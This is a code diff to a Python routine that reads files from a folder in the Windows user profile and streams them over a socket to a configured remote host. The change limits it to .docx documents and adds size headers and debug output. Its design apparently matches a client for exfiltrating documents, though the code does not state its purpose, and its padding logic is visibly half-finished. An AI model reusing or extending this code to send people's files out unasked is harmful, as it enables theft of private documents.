@@ -1,3 +1,4 @@
+import os
 from os import path, listdir
 from os.path import isfile
 from glob import glob
@@ -71,45 +72,62 @@ def sendFiles(filedir: str):
         suck.connect((CONNF_HOST, CONNF_PORT))
         print("Connected socket")
 
-        bannedtypes = [".lnk", ".rdp", ".ini"]
+        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",]
         for filename in listdir(full_path): # Get each file in folder
             if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
                 print("Got filename: ", filename)
-                
-                # ak to je image tak posli inaksi console prikaz
-                if filename.endswith(".jpg") or filename.endswith(".png"):
-                    # encode() a bytes() robia skoro to iste
-                    msg = f"FILENAME_IMG{sep}{filename}"
-                    suck.send(msg.encode("utf-8")) # FILENAME:{filename}
 
-                else:
+                # Send Filename 
+                if filename.endswith(".docx"):
                     msg = f"FILENAME_TEXT{sep}{filename}"
+                    remain = len(msg) - 77 
+                    if remain !=0:
+                        msg = f"FILENAME_TEXT{sep}{filename}" + f" "* (remain*-1) 
                     suck.send(msg.encode("utf-8")) # FILENAME:{filename}
 
-                # THIS WILL OPEN THE FILE AS READ BYTES
-                dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "rb")
-                print("Got file dir: ", dict_files.name)
+                    # THIS WILL OPEN THE FILE AS READ BYTES
+                    dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "rb")
+                    print("Got file dir: ", dict_files.name)
 
-
-                file_data = dict_files.readline(1024)
-                print(file_data)
-                while(file_data):
-                    time.sleep(0.02)
-                    if filename.endswith(".jpg") or filename.endswith(".png"):
-                        print(msg)
-                        msg = f"IMG_DATA{sep}{file_data}"
-                    else:
-                        msg = f"TXT_DATA{sep}{file_data}"
-                    print(msg)
+                    # ? Send the filesize before the data
+                    file_size = os.path.getsize("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename)
+                    msg = f"TXT_DATA{sep}{file_size}"
+                    remain = len(msg) - 77 
+                    
+                    if remain !=0:
+                        msg = f"TXT_DATA{sep}{file_size}" + f" "* (remain*-1) 
                     suck.send(msg.encode("utf-8"))
-                    msg = ""
-                    file_data = dict_files.readline(1024)
+                    print(msg, len(msg))
+
+                    file_data = dict_files.read(64)
+                    while(file_data):
+                        s = """msg = f"TXT_DATA{sep}{file_data}"
+                        aad = f"TXT_DATA{sep}"
+                        packet = bytes(msg, 'utf-8')"""
+
+                        print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")        
+                        #print(f"HEADER SIZE: {len(aad)}, {aad}" )
+                        print(len(file_data), file_data)
+                        #print(len(msg), msg)
+                        #print(f"MSG TO BYTES SIZE: {len(packet)}")
+                        print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")
+                        
+                        # ! FOUND THE ISSUE
+                        # ! THE readline(64) function DOESNT ACTUALLY RETURN A 64 CHARACTER MESSAGE
+                        # ! MANY OF THE MESSAGES ARE EITHER OVER 150 CHARACTERS LONG
+                        # ! OR THEY ARE UNDER 20 CHARS LONG
+                        # TODO Force the readline command to only read at max 64 characters 
+                        # TODO If the message is too small add spaces to fill the 64 character message limit
+
+                        suck.send(file_data)
+                        msg = ""
+                        file_data = dict_files.read(64)
                 
-                time.sleep(0.02)
-                msg = f"FINISH{sep}Completed"
-                suck.send(msg.encode("utf-8"))
-                print("Transfer completed")
-                msg = ""
+                    time.sleep(0.02)
+                    msg = f"FINISH{sep}Completed"
+                    suck.send(msg.encode("utf-8"))
+                    print("Transfer completed")
+                    msg = ""
 
         time.sleep(0.02)         
         suck.send(f"CLOSE{sep}Closing down".encode("utf-8"))
